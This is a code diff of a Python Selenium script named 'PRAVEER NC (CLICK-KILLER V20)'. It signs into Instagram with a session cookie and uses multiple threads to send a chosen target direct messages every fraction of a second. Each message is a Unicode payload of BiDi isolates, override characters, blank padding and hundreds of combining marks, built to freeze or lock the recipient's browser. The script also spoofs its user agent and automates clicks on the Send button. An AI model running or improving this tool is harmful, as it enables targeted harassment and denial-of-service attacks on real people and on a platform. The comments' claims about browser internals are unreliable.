@@ -1,46 +1,41 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (UNIVERSAL CPU-CRUSHER)
-# 📅 STATUS: GECKO-REFLOW + CHROMIUM-THRASHER | 10 AGENTS | 0.1s BURST
+# 🚀 PROJECT: PRAVEER NC (CLICK-KILLER V20)
+# 📅 STATUS: EVENT-LOOP HIJACK | x20 DENSITY | GHOST INJECTION
 
 import os, time, random, threading, sys, gc, tempfile
 from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
 
 # --- MATRIX CONFIG ---
 THREADS = 2
-SESSION_LIMIT = 180 
+SESSION_LIMIT = 300 
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_universal_crusher_payload(target_name):
-    """The Universal Crusher: Optimized for Chrome and Firefox Freezes."""
-    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 SYSTEM FAILURE: {target_name.upper()} HAS BEEN OWNED\n"
+def get_click_killer_payload(target_name):
+    """The Click-Killer: Disables UI interaction via Isolate Nesting."""
+    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 UI_INTERACTION_BLOCKED: {target_name.upper()}\n"
     
-    # 💥 THE 'GECKO-TRAP' (ZWNJ + Variation Selectors)
-    # Forces Firefox to restart text-shaping every 2 characters.
-    gecko_trap = "\u200C\ufe0f" * 150 
+    # 💥 THE 'ISOLATE TRAP' (Recursive Nesting)
+    # This forces the browser to traverse 150 layers for every mouse-click event.
+    isolate_trap = "\u2066\u2067\u2068" * 150 
     
-    # 💥 PLANE-1 OVERLAYS (Vector Glyphs)
-    # Triggers 'Complex Rendering Path' in all browsers.
-    vector_chaos = "𝔓𝔄𝔙𝔈𝔈𝔔 𝔓𝔄𝔓𝔄 " * 8
+    # 💥 THE 'WIDTH-BOMB' (Horizontal Displacement)
+    width_bomb = "\u2800\u00A0" * 150 
     
-    # 💥 THE '8x DENSITY' ZALGO (100 marks per character)
-    z_tower = "̸" * 100
+    # 💥 DENSITY x20 (200 marks per character)
+    # Total GPU saturation.
+    z_tower = "̸" * 200
     
-    # 💥 MEMORY BLOAT (6,500 invisible markers)
-    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060", "\uFEFF"]) for _ in range(6500))
+    lines = [header, isolate_trap]
     
-    lines = [header, gecko_trap, vector_chaos, bloat]
-    
-    for i in range(65):
-        # BiDi Overloads to target the 'Directional Stack' in Firefox/Gecko
-        prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        # Adding ZWNJ (\u200C) at the end of each line to force reflow
-        lines.append(f"{prefix} 𝖯𝖱𝖠𝖵𝖤𝖤𝖱_𝖮𝖶𝖭𝖲_𝖸𝖮𝖴 {z_tower} \u200C")
-    
-    return "\n".join(lines)[:9950]
+    for i in range(75):
+        # We alternate 'First Strong Isolate' markers to break the button's event listener
+        prefix = "\u2068\u202E" if i % 2 == 0 else "\u2069\u202D"
+        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_LOCKED{z_tower}")
+        
+    return "\n".join(lines)[:9990]
 
 def get_driver(agent_id):
     chrome_options = Options()
@@ -49,7 +44,6 @@ def get_driver(agent_id):
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--disable-gpu")
     chrome_options.add_argument("--window-size=1920,1080")
-    # 2026 Stealth User-Agent
     chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
     return webdriver.Chrome(options=chrome_options)
 
@@ -57,7 +51,7 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         try:
-            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ UNIVERSAL CRUSHER DEPLOYED...", flush=True)
+            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ CLICK-KILLER V20 DEPLOYED...", flush=True)
             driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
@@ -69,19 +63,28 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
             session_start = time.time()
             while (time.time() - session_start) < SESSION_LIMIT:
                 try:
-                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
+                    payload = get_click_killer_payload(target_name)
                     
-                    # 🔥 HIGH-IMPACT BURST: 0.1s - 0.3s
-                    payload = get_universal_crusher_payload(target_name)
+                    # 🔥 THE GHOST INJECTION (Bypasses UI Lag)
                     driver.execute_script("""
-                        var el = arguments[0];
-                        document.execCommand('insertText', false, arguments[1]);
-                        el.dispatchEvent(new Event('input', { bubbles: true }));
-                    """, box, payload)
+                        var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
+                        if (box) {
+                            // Direct State Injection
+                            box.focus();
+                            document.execCommand('insertText', false, arguments[0]);
+                            box.dispatchEvent(new Event('input', { bubbles: true }));
+                            
+                            // Native Click Dispatch to bypass the target's UI lag
+                            var btns = document.querySelectorAll('div[role="button"]');
+                            for(var b of btns) {
+                                if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
+                                    b.dispatchEvent(new MouseEvent('click', {view: window, bubbles: true, cancelable: true}));
+                                }
+                            }
+                        }
+                    """, payload)
                     
-                    box.send_keys(Keys.ENTER)
-                    
-                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 IMPACT DELIVERED", flush=True)
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 UI_LOCKED", flush=True)
                     time.sleep(random.uniform(0.1, 0.3)) 
                     
                 except:
